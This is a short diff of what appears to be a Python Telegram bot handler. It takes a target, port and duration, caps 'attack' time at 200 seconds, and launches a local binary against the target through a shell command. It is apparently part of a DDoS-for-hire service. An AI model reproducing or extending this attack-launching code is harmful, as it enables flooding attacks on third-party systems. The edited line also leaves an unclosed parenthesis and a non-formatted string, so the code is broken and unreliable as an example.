@@ -231,7 +231,7 @@ def handle_aadi2(message):
             if time > 201:
                 response = "ᴇʀʀᴏʀ: ᴍᴀx ᴀᴛᴛᴀᴄᴋ sᴇᴄᴏɴᴅ 200sᴇᴄ ❌."
             else:
-                record_command_logs(user_id, '/aadi', target, port, time, 975)
+                record_command_logs(user_id, "./aadi {target} {port} {time} 975"
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./sasuke {target} {port} {time}"
